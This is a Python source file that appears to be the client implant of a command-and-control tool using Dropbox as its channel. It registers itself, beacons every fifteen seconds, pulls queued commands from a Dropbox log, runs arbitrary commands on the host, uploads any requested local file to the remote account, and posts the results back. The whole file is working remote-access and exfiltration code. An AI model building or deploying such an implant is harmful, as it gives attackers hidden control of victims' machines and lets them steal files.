import time, os.path
import client.exec as cexec
import client.payloads as cpayload
import client.id as cid
import ccchanel.file as ccfile
import ccchanel.log as cclog
import ccchanel.dropbox_api as cc_api

def amIRegistered(dbx, id):
    file_list_dict = ccfile.list_files(dbx, '')
    file_list = file_list_dict.keys()
    return id in file_list
def registerSelf(dbx, id):
    cclog.log_init(dbx, '/' + id)

def tellAlive(dbx, id):
    cclog.log_append(dbx, '/' + id, cpayload.alive_create())

def getCommand(dbx, id):
    log = cclog.log_read(dbx, '/' + id)
    dones = []
    for log_entry in reversed(log):
        if log_entry.get('done', False):
            dones += [log_entry['done']['id']]
        elif log_entry.get('command', False) and log_entry['command']['id'] not in dones:
            return log_entry.get('command')
    return None

def execute_command(dbx, id, local_path, *args):
    if local_path == 'upload':
        local_file_path = args[0]
        remote_file_path = f"/{id}_{local_file_path.replace('/', '_')}"
        print(f"CLIENT: executing upload {local_file_path}")
        ccfile.upload_file(dbx, local_file_path, remote_file_path)
        return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
    else:
        return cexec.execute_arbitrary_command(local_path, *args)

if __name__ == "__main__":
    sleep_time = 15
    dbx = cc_api.dropbox_login()
    ls = ccfile.list_files(dbx, '')
    id = cid.id()
    if not amIRegistered(dbx, id):
        registerSelf(dbx, id)
    tellAlive(dbx, id)
    while True:
        cmd = getCommand(dbx, id)
        if cmd is not None:
            cmd_id = cmd['timestamp']
            exec_out = execute_command(dbx, id, cmd['kind'], *cmd['args']).decode()
            cclog.log_append(dbx, '/' + id, cpayload.done_create(cmd_id, exec_out))
        print(f"SLEEP {sleep_time}")
        time.sleep(sleep_time)
        cclog.log_append(dbx, '/' + id, cpayload.ping_create())
